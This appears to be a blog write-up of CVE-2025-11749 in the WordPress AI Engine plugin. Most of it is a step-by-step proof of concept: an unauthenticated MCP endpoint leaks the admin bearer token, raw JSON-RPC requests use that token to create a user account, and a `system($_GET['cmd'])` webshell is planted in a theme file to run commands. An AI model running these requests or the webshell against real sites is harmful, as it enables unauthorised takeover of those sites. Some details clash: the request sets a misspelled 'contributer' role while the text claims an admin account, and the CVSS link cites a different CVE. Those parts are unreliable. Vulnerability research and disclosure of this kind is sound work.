---
layout: post
title:  "CVE-2025-11749 - Sensitive Data Disclosure leading to RCE Analysis"
date:   2025-11-06 10:25:56 +0700
categories: wordpress
---
# Info:

Type: Sensitive Data Disclosure

Plugin Name: AI Engine

Version: < 3.1.4

**Base Score:** [**9.8 CRITICAL**](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?name=CVE-2024-38773&vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&version=3.1&source=NIST)

**Vector:**  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

WPScan: [WPScan](https://wpscan.com/vulnerability/1595af73-6f97-4bc9-9cb2-14a55daaa2d4/)

# PoC:

## Setup

Install the environment and the AI Engine plugin following the guide [here](https://t0t0r0o.github.io/writeups/wordpress/2025/10/29/setup.html).

After installing and activating the plugin, configure it as follows:

- Step 1: Select AI Engine from the admin menu
- Step 2: Go to Settings
- Step 3: In Settings, choose the MCP tab
- Step 4: Select SSE Endpoint
- Step 5: Enter any Bearer Token
- Step 6: Choose the No-Auth URL
- Step 7: Under MCP Features select WordPress

![image.png]({{ site.url }}/assets/images/CVE-2025-11749/image-1.png)

## Exploit

From an unauthenticated client we can access the `/mcp/v1/sse` API directly. The returned content includes API endpoints and the Bearer Token created by the administrator.

![image.png]({{ site.url }}/assets/images/CVE-2025-11749/image-2.png)

Use the obtained token to call `mcp_ping` with the following request:

```
POST /index.php?rest_route=/mcp/v1/Test123/sse HTTP/1.1
Host: localhost:9000
Authorization: Bearer Test123
Content-Type: application/json
Content-Length: 130

{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "mcp_ping",
    "arguments": {}
  },
  "id": 1
}
```

![image.png]({{ site.url }}/assets/images/CVE-2025-11749/image-3.png)

Using the token, create an admin user with this request:

```
POST /index.php?rest_route=/mcp/v1/Test123/messages HTTP/1.1
Host: localhost:9000
Authorization: Bearer Test123
Content-Type: application/json
Content-Length: 313

{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "wp_create_user",
    "arguments": {
      "user_login": "admin2",
      "user_email": "admin2@example.com", 
      "user_pass": "123456@aA",
      "display_name": "New Admin 2",
      "role": "contributer"
    }
  },
  "id": 1
}
```

![image.png]({{ site.url }}/assets/images/CVE-2025-11749/image-4.png)

Log in with the newly created account:

![image.png]({{ site.url }}/assets/images/CVE-2025-11749/image-5.png)

From the admin dashboard perform the following steps to achieve code execution:

- Step 1: Choose Tools from the admin menu
- Step 2: Select Theme File Editor
- Step 3: Choose the Twenty Twenty Two theme
- Step 4: Select the `index.php` file
- Step 5: Insert `system($_GET['cmd']);` into the file

![image.png]({{ site.url }}/assets/images/CVE-2025-11749/image-6.png)

Invoke the webshell at `/wp-content/themes/twentytwentytwo/index.php?cmd=id` to run commands.

![image.png]({{ site.url }}/assets/images/CVE-2025-11749/image-7.png)
